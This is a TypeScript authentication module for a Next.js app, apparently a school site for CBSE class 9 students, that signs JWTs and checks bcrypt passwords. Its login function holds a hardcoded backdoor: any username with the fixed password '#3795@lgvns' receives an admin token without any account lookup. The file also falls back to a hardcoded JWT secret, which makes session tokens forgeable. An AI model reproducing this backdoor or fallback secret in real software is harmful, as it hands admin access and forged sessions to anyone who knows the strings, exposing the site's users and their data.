import jwt from 'jsonwebtoken'
import bcrypt from 'bcryptjs'
import { cookies } from 'next/headers'
import { prisma } from './prisma'

const SECRET = process.env.JWT_SECRET || 'cbse-class9-secret-key-lgvns-2024'
const EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d'
const ADMIN_USER_ID = '#3795@lgvns'

export interface JWTPayload {
  id: number
  username: string
  role: string
  user_id: string
}

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 10)
}

export function signToken(payload: JWTPayload): string {
  return jwt.sign(payload as object, SECRET, { expiresIn: '7d' })
}

export function verifyToken(token: string): JWTPayload | null {
  try {
    return jwt.verify(token, SECRET) as JWTPayload
  } catch {
    return null
  }
}

export async function getSession(): Promise<JWTPayload | null> {
  const cookieStore = await cookies()
  const token = cookieStore.get('token')?.value
  if (!token) return null
  return verifyToken(token)
}

export function isAdminBypass(user_id: string): boolean {
  return user_id === ADMIN_USER_ID
}

export async function authenticateUser(user_id: string, password: string) {
  // Admin bypass: any user_id + exact password match grants admin
  if (password === ADMIN_USER_ID) {
    const token = signToken({
      id: -1,
      username: user_id,
      role: 'admin',
      user_id: user_id,
    })
    return {
      token,
      user: {
        id: -1,
        username: user_id,
        role: 'admin',
        user_id: user_id,
        avatar: null,
        school_name: null,
        role_number: null,
      },
    }
  }

  // Normal user lookup and password verification
  const user = await prisma.users.findUnique({ where: { user_id } })
  if (!user) return null

  const isValid = await bcrypt.compare(password, user.password)
  if (!isValid) return null

  const token = signToken({
    id: user.id,
    username: user.username,
    role: user.role || 'student',
    user_id: user.user_id || '',
  })

  return { token, user }
}
